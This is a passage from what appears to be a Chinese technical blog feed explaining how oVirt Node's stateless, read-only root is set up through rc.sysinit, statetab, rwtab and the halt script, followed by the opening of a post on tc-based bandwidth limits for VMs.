class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/dev/root / ext2 defaults,ro,noatime 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">devpts /dev/pts devpts gid=5,mode=620 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tmpfs /dev/shm tmpfs defaults 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proc /proc proc defaults 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sysfs /sys sysfs defaults 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/dev/HostVG/Config /config ext4 defaults,noauto,noatime 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">debugfs /sys/kernel/debug debugfs 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/dev/HostVG/Swap swap swap defaults 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/dev/HostVG/Logging /var/log ext4 defaults,noatime 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/dev/HostVG/Data /data ext4 defaults,noatime 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/data/images /var/lib/libvirt/images bind bind 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/data/core /var/log/core bind bind 0 0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这里要注意的地方就是root后面的ro，也就是说被挂载成了只读，这说明stateless是在挂载磁盘之前就已经完成，那肯定跟系统启动相关，
接着我们找到rc.sysinit这个在系统启动阶段执行的脚本中下面这段内容:</p><p>/etc/rc.d/rc.sysinit</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:#36acaa">file</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> /etc/statetab /etc/statetab.d/* </span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    is_ignored_file </span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">$file</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token builtin class-name">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!</span><span class="token plain"> -f </span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">$file</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token builtin class-name">continue</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> -f </span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">$STATE_MOUNT</span><span class="token string" style="color:#e3116c">/</span><span class="token string variable" style="color:#36acaa">$file</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">mount</span><span class="token plain"> -n --bind </span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">$STATE_MOUNT</span><span class="token string" style="color:#e3116c">/</span><span class="token string variable" style="color:#36acaa">$file</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">$file</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:#36acaa">path</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$(</span><span class="token variable function" style="color:#d73a49">grep</span><span class="token variable" style="color:#36acaa"> -v </span><span class="token variable string" style="color:#e3116c">"^#"</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable string" style="color:#e3116c">"</span><span class="token variable string variable" style="color:#36acaa">$file</span><span class="token variable string" style="color:#e3116c">"</span><span class="token variable" style="color:#36acaa"> </span><span class="token variable operator file-descriptor important" style="color:#393A34">2</span><span class="token variable operator" style="color:#393A34">&gt;</span><span class="token variable" style="color:#36acaa">/dev/null</span><span class="token variable" style="color:#36acaa">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        mount_state </span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">$path</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> -n </span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">$SELINUX_STATE</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"> -a -e </span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">$path</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> restorecon -R </span><span class="token string" style="color:#e3116c">"</span><span class="token string variable" style="color:#36acaa">$path</span><span class="token string" style="color:#e3116c">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">done</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">done</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这段shell里面牵扯到了个/etc/statetab,而且通过对比普通系统还发现其他地方的不同</p><p>diff rc.sysinit /etc/rc.sysinit</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">102a103,108</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; elif [[ "$system_release" =~ "CentOS" ]]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; [ "$BOOTUP" = "color" ] &amp;&amp; echo -en "\\033[0;36m"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; echo -en "CentOS"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; [ "$BOOTUP" = "color" ] &amp;&amp; echo -en "\\033[0;39m"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; PRODUCT=$(sed "s/CentOS \(.*\) \?release.*/\1/" /etc/system-release)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; echo " $PRODUCT"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">499c505</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt; action $"Mounting local filesystems: " mount -a -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2,noproc,nosysfs,nodevpts -O no_netdev</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">---</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; action $"Mounting local filesystems: " mount -a -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2 -O no_netdev</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">501c507</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt; action $"Mounting local filesystems: " mount -a -n -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2,noproc,nosysfs,nodevpts -O no_netdev</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">---</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; action $"Mounting local filesystems: " mount -a -n -t nonfs,nfs4,smbfs,ncpfs,cifs,gfs,gfs2 -O no_netdev</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>接着看看这个/etc/statetab文件是个什么样子的：</p><p>/etc/statetab</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># A list of paths which should be bind-mounted from a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># partition dedicated to persistent data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># See $STATE_LABEL in /etc/sysconfig/readonly-root</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Examples:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># /root</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># /etc/ssh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># /var/spool/mail</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>顺藤摸瓜我们发现和/etc/sysconfig/readonly-root这个文件有关，从文件名上即可得知和只读的关联：</p><p>/etc/sysconfig/readonly-root</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Set to </span><span class="token string" style="color:#e3116c">'yes'</span><span class="token plain"> to </span><span class="token function" style="color:#d73a49">mount</span><span class="token plain"> the system filesystems read-only.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">READONLY</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">yes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Set to 'yes' to mount various temporary state as either tmpfs</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># or on the block device labelled RW_LABEL. Implied by READONLY</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">TEMPORARY_STATE</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Place to put a tmpfs for temporary scratch writable space</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">RW_MOUNT</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/var/lib/stateless/writable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Label on local filesystem which can be used for temporary scratch space</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">RW_LABEL</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">stateless-rw</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Options to use for temporary mount</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">RW_OPTIONS</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Label for partition with persistent data</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">STATE_LABEL</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">CONFIG </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Where to mount to the persistent data</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">STATE_MOUNT</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/config</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Options to use for peristent mount</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">STATE_OPTIONS</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># NFS server to use for persistent data?</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">CLIENTSTATE</span><span class="token operator" style="color:#393A34">=</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>就是这个了，首先它把READONLY设置为yes，然后使用设备的LABEL号来指定需要挂载为读写的设备，然后就是挂载的位置STATE_MOUNT</p><p>同时还有/etc/rwtab以及rwtab.d目录与这个有关：
/etc/rwtab</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#files /etc/adjtime</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#files /etc/ntp.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#files /etc/resolv.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#files /etc/lvm/.cache</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#files /etc/lvm/archive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#files /etc/lvm/backup</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>上面这几项在ovirt-node里是被注释掉了的，它使用自己的方式来变更这几个文件</p><p>/etc/rwtab.d/ovirt</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">files /etc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dirs /var/lib/multipath</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dirs /var/lib/net-snmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dirs /var/lib/dnsmasq</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /root/.ssh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dirs /root/.uml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dirs /root/.virt-manager</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dirs /home/admin/.virt-manager</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /var/cache/libvirt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /var/empty/sshd/etc/localtime</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /var/lib/libvirt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /var/lib/multipath</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /var/cache/multipathd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">empty /mnt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">empty /live</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /boot</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">empty /boot-kdump</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">empty /cgroup</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>上面这些是ovirt自定义的。最后就是看/config下面的files文件:</p><p>/config/files</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/etc/fstab</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/shadow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/default/ovirt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/ssh_host_key</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/ssh_host_key.pub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/ssh_host_dsa_key</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/ssh_host_dsa_key.pub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/ssh_host_rsa_key</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/ssh_host_rsa_key.pub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/iscsi/initiatorname.iscsi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/sysconfig/network-scripts/ifcfg-eth0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/sysconfig/network-scripts/ifcfg-breth0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/sysconfig/network-scripts/ifcfg-eth1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ntp.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/sysconfig/network</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/hosts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/shadow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/sshd_config</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>此列表内的文件就是rc.sysinit需要读取的，把他们一个个挂载为读写，这样就实现了可修改配置文件白名单，于是我就动手修改了系统里的这些文件，重启，一切看似正常，但是当关机的时候新的问题出现了，关机的时候提示/etc无法被卸载，为什么呢，然后就找到与关机有关的脚本：</p><p>diff /etc/rc.d/init.d/halt.orig /etc/rc.d/init.d/halt</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">141c141</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt; LANG=C __umount_loop '$2 ~ /^\/$|^\/proc|^\/dev/{next}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">---</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; LANG=C __umount_loop '$2 ~ /^\/$|^\/proc|^\/etc|^\/dev/{next}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>原来在halt文件里也做了“手脚”，把/etc给加了进去，重启，修改，关机，一切正常。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="参考文档">参考文档<a class="hash-link" href="#参考文档" title="标题的直接链接">​</a></h2><p>下面是可以参考的文档</p><ul><li><a href="http://fedoraproject.org/wiki/StatelessLinux/PrepareImage" target="_blank" rel="noopener noreferrer">http://fedoraproject.org/wiki/StatelessLinux/PrepareImage</a></li><li><a href="http://fedoraproject.org/wiki/StatelessLinux/HOWTO" target="_blank" rel="noopener noreferrer">http://fedoraproject.org/wiki/StatelessLinux/HOWTO</a></li><li><a href="http://blog.csdn.net/jcwkyl/article/details/6120547" target="_blank" rel="noopener noreferrer">http://blog.csdn.net/jcwkyl/article/details/6120547</a></li><li><a href="http://plone.lucidsolutions.co.nz/linux/io/using-centos-5.2-stateless-linux-support-on-a-flash-based-root-filesystem" target="_blank" rel="noopener noreferrer">http://plone.lucidsolutions.co.nz/linux/io/using-centos-5.2-stateless-linux-support-on-a-flash-based-root-filesystem</a></li><li>FYI: <a href="http://ovirt.org/wiki/File:Ovirt-node.pdf" target="_blank" rel="noopener noreferrer">http://ovirt.org/wiki/File:Ovirt-node.pdf</a> (page 26)</li></ul>]]></content>
        <category label="ovirt" term="ovirt"/>
        <category label="stateless" term="stateless"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[使用libvirt和tc实现vm带宽控制]]></title>
        <id>/2013/03/01/libvirt-tc-bandwidth-control</id>
        <link href="https://itxx00.github.io/notes/blog/2013/03/01/libvirt-tc-bandwidth-control"/>
        <updated>2013-03-01T00:00:00.000Z</updated>
        <content type="html"><![CDATA[<blockquote><p>在kvm虚拟机管理的过程当中，对虚拟机带宽进行良好的控制是十分重要的。</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><p>linux系统当中对网络带宽的控制一般都是使用tc命令实现，tc即是traffic control的缩写，在<a href="http://linux-ip.net/articles/Traffic-Control-HOWTO/" target="_blank" rel="noopener noreferrer">这里</a>可以找到有关tc命令的内容。</p><p>当然你可以手动使用tc命令来处理这些事情，比如使用cbq队列，htb队列等，都是可以实现的，网上找找应该有很多关于这方面的资料，</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="cbq队列示例">cbq队列示例<a class="hash-link" href="#cbq队列示例" title="标题的直接链接">​</a></h2><p>比如下面就是使用cbq队列限制src ip为192.168.1.102发送数据包的速率:</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1建立cbq队列">1.建立cbq队列<a class="hash-link" href="#1建立cbq队列" title="标题的直接链接">​</a></h3><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tc qdisc add dev eth0 root handle 1: cbq avpkt 1000 bandwidth 100mbit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2建立带宽限制分类">2.建立带宽限制分类<a class="hash-link" href="#2建立带宽限制分类" title="标题的直接链接">​</a></h3><div class="codeBlockContainer_Ckt0 